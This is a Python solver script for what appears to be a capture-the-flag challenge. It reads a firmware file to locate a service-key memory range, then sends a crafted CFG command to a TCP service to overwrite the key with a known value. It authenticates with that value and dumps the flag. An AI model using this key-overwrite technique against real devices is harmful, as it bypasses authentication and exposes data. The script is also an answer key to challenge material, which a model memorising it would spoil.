
#!/usr/bin/env python3
# Dependencies: Python 3 standard library only.

import ast
from pathlib import Path
import re
import socket
import sys

FIRMWARE = Path("foundation_one_fw.py")


def service_key_offset(source: str) -> tuple[int, int]:
    # Recover the service-key slice from Sat.__init__, without executing firmware.
    tree = ast.parse(source)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Assign):
            continue
        for target in node.targets:
            if not isinstance(target, ast.Subscript):
                continue
            if not isinstance(target.value, ast.Attribute) or target.value.attr != "mem":
                continue
            if not isinstance(target.slice, ast.Slice):
                continue
            lo = target.slice.lower
            hi = target.slice.upper
            if not isinstance(lo, ast.Constant) or not isinstance(hi, ast.Constant):
                continue
            if not isinstance(node.value, ast.Call):
                continue
            if isinstance(node.value.func, ast.Attribute) and node.value.func.attr == "urandom":
                return int(lo.value), int(hi.value)
    raise ValueError("Unable to locate firmware maintenance-key range")


HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9707

# Extract the key's memory range from the supplied firmware before exploiting CFG.
key_start, key_end = service_key_offset(FIRMWARE.read_text(encoding="utf-8"))
new_key = b"ABCD"
if key_end - key_start != len(new_key):
    raise ValueError("Service-key length differs from the expected protocol key size")
print(f"Firmware service-key region: mem[{key_start}:{key_end}]")
payload = bytes(key_start) + new_key

commands = [
    b"CFG " + payload.hex().encode("ascii"),
    b"AUTH " + new_key.hex().encode("ascii"),
    b"DUMP",
]

with socket.create_connection((HOST, PORT), timeout=10) as sock:
    stream = sock.makefile("rb")

    print(stream.readline().decode("ascii").strip())

    for command in commands:
        sock.sendall(command + b"\n")
        response = stream.readline().decode("ascii").strip()
        print(f"{command.decode('ascii')}: {response}")

        if command.startswith(b"AUTH ") and response != "MAINT OK":
            raise RuntimeError("Authentication failed")

        if command == b"DUMP":
            match = re.search(r"GAIANSPACE\{[^}]+\}", response)
            if match is None:
                raise RuntimeError("Flag not found")
            print(f"\nFLAG: {match.group(0)}")

